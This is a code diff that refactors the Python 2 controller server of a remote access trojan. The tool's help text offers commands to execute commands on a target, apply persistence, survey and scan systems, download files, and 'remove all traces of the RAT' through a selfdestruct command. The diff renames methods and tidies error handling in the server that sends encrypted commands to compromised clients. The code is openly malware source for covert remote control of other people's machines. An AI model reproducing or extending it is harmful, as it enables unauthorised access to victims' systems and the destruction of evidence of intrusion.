@@ -30,24 +30,24 @@ BANNER = '''
 CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                     'selfdestruct', 'survey', 'unzip', 'wget' ]
 HELP_TEXT = '''
-Command             - Description
+Command             | Description
 ---------------------------------------------------------------------------
-cat <file>          - Output a file to the screen.
-client <id>         - Connect to a client.
-clients             - List connected clients.
-execute <command>   - Execute a command on the target.
-goodbye             - Exit the server and selfdestruct all clients.
-help                - Show this help menu.
-kill                - Kill the client connection.
-ls                  - List files in the current directory.
-persistence         - Apply persistence mechanism.
-pwd                 - Get the present working directory.
-quit                - Exit the server and keep all clients alive.
-scan <ip>           - Scan top 25 TCP ports on a single host.
-selfdestruct        - Remove all traces of the RAT from the target system.
-survey              - Run a system survey.
-unzip <file>        - Unzip a file.
-wget <url>          - Download a file from the web.'''
+cat <file>          | Output a file to the screen.
+client <id>         | Connect to a client.
+clients             | List connected clients.
+execute <command>   | Execute a command on the target.
+goodbye             | Exit the server and selfdestruct all clients.
+help                | Show this help menu.
+kill                | Kill the client connection.
+ls                  | List files in the current directory.
+persistence         | Apply persistence mechanism.
+pwd                 | Get the present working directory.
+quit                | Exit the server and keep all clients alive.
+scan <ip>           | Scan top 25 TCP ports on a single host.
+selfdestruct        | Remove all traces of the RAT from the target system.
+survey              | Run a system survey.
+unzip <file>        | Unzip a file.
+wget <url>          | Download a file from the web.'''
 
 
 class Server(threading.Thread):
@@ -75,26 +75,15 @@ class Server(threading.Thread):
         try:
             enc_message = encrypt(message, client.dhkey)
             client.conn.send(enc_message)
-        except:
-            print 'Error: Could not connect to client.'
+        except Exception as e:
+            print 'Error: {}'.format(e)
 
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
             print decrypt(recv_data, client.dhkey)
-        except:
-            print 'Error: Could not connect to client.'
-
-    def get_clients(self):
-        return [v for _, v in self.clients.items()]
-
-    def remove_client(self, key):
-        return self.clients.pop(key, None)
-
-    def list_clients(self, _):
-        print 'ID - Client Address\n-------------------'
-        for k, v in self.clients.items():
-            print '{:>2} - {}'.format(k, v.addr[0])
+        except Exception as e:
+            print 'Error: {}'.format(e)
 
     def select_client(self, client_id):
         try:
@@ -103,7 +92,30 @@ class Server(threading.Thread):
         except (KeyError, ValueError):
             print 'Error: Invalid Client ID.'
 
-    def quit(self, _):
+    def remove_client(self, key):
+        return self.clients.pop(key, None)
+
+    def kill_client(self, _):
+        self.send_client('kill', self.current_client)
+        self.current_client.conn.close()
+        self.remove_client(self.current_client.uid)
+        self.current_client = None
+
+    def selfdestruct_client(self, _):
+        self.send_client('selfdestruct', self.current_client)
+        self.current_client.conn.close()
+        self.remove_client(self.current_client.uid)
+        self.current_client = None
+
+    def get_clients(self):
+        return [v for _, v in self.clients.items()]
+
+    def list_clients(self, _):
+        print 'ID | Client Address\n-------------------'
+        for k, v in self.clients.items():
+            print '{:>2} | {}'.format(k, v.addr[0])
+
+    def quit_server(self, _):
         if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
             for c in self.get_clients():
                 self.send_client('quit', c)
@@ -111,7 +123,7 @@ class Server(threading.Thread):
             self.s.close()
             sys.exit(0)
 
-    def goodbye(self, _):
+    def goodbye_server(self, _):
         if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
             for c in self.get_clients():
                 self.send_client('selfdestruct', c)
@@ -119,19 +131,7 @@ class Server(threading.Thread):
             self.s.close()
             sys.exit(0)
 
-    def kill(self, _):
-        self.send_client('kill', self.current_client)
-        self.current_client.conn.close()
-        self.remove_client(self.current_client.uid)
-        self.current_client = None
-
-    def selfdestruct(self, _):
-        self.send_client('selfdestruct', self.current_client)
-        self.current_client.conn.close()
-        self.remove_client(self.current_client.uid)
-        self.current_client = None
-
-    def help(self, _):
+    def print_help(self, _):
         print HELP_TEXT
 
 
@@ -180,11 +180,11 @@ def main():
     server_commands = {
         'client':       server.select_client,
         'clients':      server.list_clients,
-        'goodbye':      server.goodbye,
-        'help':         server.help,
-        'kill':         server.kill,
-        'quit':         server.quit,
-        'selfdestruct': server.selfdestruct
+        'goodbye':      server.goodbye_server,
+        'help':         server.print_help,
+        'kill':         server.kill_client,
+        'quit':         server.quit_server,
+        'selfdestruct': server.selfdestruct_client
     }
 
     while True:
